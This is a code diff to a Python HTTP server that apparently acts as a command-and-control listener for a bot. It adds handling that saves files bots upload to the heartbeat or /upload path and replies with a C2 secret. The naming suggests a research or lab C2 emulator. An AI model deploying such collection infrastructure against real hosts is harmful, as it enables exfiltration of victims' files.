@@ -145,15 +145,20 @@ def handle_http(conn, addr, port_label):
                     continue
                 method, path, _ver = reqline.split(" ", 2)
                 clen = 0
+                ctype = ""
                 for h in lines[1:]:
-                    if h.lower().startswith("content-length:"):
+                    hl = h.lower()
+                    if hl.startswith("content-length:"):
                         clen = int(h.split(":", 1)[1].strip())
+                    elif hl.startswith("content-type:"):
+                        ctype = h.split(":", 1)[1].strip().lower()
+                    if clen and ctype:
                         break
                 if len(rest) < clen:
                     break  # need more body bytes
                 body = rest[:clen]
                 buf = rest[clen:]
-                handle_request(method, path, body, addr, port_label, conn)
+                handle_request(method, path, body, addr, port_label, conn, ctype)
     except (socket.timeout, ConnectionResetError, BrokenPipeError):
         pass
     except Exception as e:
@@ -165,8 +170,35 @@ def handle_http(conn, addr, port_label):
             pass
 
 
-def handle_request(method, path, body, addr, port_label, conn):
+def handle_request(method, path, body, addr, port_label, conn, ctype=""):
     ts = datetime.now(timezone.utc).isoformat()
+    # #134: bot `upload` command POSTs the file as application/octet-stream
+    # (src/protocol.c http_upload). The default remote path is the heartbeat
+    # path, so an octet-stream POST there is an upload, not a command
+    # response. Explicit `upload <f> /upload` hits the dedicated route. Both
+    # persist the bytes (previously acked + silently dropped).
+    if method == "POST" and (
+            (path.rstrip("/") == HTTP_PATH.rstrip("/") and "octet-stream" in ctype)
+            or path.endswith("/upload")):
+        up_dir = os.path.join(os.path.dirname(EVIDENCE), "uploads")
+        try:
+            os.makedirs(up_dir, exist_ok=True)
+        except OSError:
+            pass
+        name = os.path.basename(path.rstrip("/"))
+        if not name or name == "upload":
+            name = f"upload-{int(time.time() * 1000)}-{addr[0].replace('.', '_')}.bin"
+        dest = os.path.join(up_dir, name)
+        try:
+            with open(dest, "wb") as f:
+                f.write(body)
+        except OSError:
+            pass
+        with lock:
+            stats["uploads"] += 1
+        log(f"{port_label} UPLOAD from {addr[0]} len={len(body)} -> {dest}")
+        send_response(conn, json.dumps({"status": "ok", "secret": C2_SECRET}))
+        return
     if method == "POST" and path.rstrip("/") == HTTP_PATH.rstrip("/"):
         text = body.decode("utf-8", errors="replace")
         try:
